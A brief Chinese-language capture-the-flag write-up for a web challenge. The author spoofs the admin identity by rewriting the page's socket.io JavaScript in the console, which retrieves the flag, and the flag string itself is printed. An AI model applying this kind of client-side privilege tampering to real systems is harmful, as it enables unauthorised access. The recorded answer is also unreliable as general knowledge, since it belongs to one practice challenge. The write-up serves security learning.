# old-58_150

* 這一題一進去可以看到整片空白只有下面的 send
* 隨便按了一下跟我說 command not found
* 直接猜他是 command injection
* 輸入 help 查看一下有什麼命令可以用 `ls id flag help` 啪啪啪直接打臉 ...
* 直接輸入 flag 看到 permission denied 要 admin 才可以查看
* 所以直接改 js 
    ```js=  
    $(function () {
      var username = "admin";
      var socket = io();
      $('form').submit(function(e){
        e.preventDefault();
        socket.emit('cmd',username+":"+'flag');
        $('#m').val('');
        return false;
      });
      socket.on('cmd', function(msg){
        $('#messages').append($('<li>').text(msg));
      });
    });  
    ```
    放在 console 裡面之後輸入 flag 
    `permission denied... admin only!`
    `FLAG{do_you_know_about_darkhotel}`
* flag : FLAG{do_you_know_about_darkhotel}
